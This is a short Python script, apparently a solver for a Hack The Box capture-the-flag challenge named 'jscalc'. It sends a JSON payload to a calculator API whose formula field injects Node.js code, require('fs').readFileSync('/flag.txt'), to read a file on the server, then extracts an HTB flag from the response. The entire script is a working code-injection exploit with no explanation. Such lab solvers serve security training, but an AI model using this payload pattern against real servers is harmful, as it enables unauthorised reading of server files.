import sys
import requests
import re

if  len(sys.argv) != 2:
    print("Usage: python3 jscalc.py ip:port")
    sys.exit(1)
host = sys.argv[1]
url = f"http://{host}/api/calculate"
data = {
    "formula": "require('fs').readFileSync('/flag.txt', 'utf-8')"
}
try:
    r = requests.post(url, json=data, timeout=5)
    r.raise_for_status()
except requests.exceptions.RequestException as e:
    print(f"Failed to send request {e}")
    sys.exit(1)

flag = re.search(r"HTB\{.*?\}", r.text)

if flag:
    print("Flag:", flag.group(0))
else:
    print("Flag not found")
